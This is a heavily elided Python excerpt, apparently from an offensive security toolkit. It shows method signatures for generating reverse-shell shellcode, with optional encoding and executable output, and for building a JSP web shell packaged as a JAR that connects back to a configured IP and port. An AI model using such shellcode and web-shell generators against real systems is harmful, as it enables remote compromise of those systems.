...
class OSShellcodes:
	...
	def create_shellcode(self, _shellcode_type = 'reverse', command = 'calc.exe', message = '', encode = None,
	                     make_exe = 0,
...
class WebShell:
	...
	def create_shellcode(self, shell_type, inline = False):
		...
		if shell_type == SHELLCODE_TYPE.JSP:
			...
			shell = JavaShellCode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT, shell_type = SHELLCODE_TYPE.JAR,
			                      make_jar = 1)
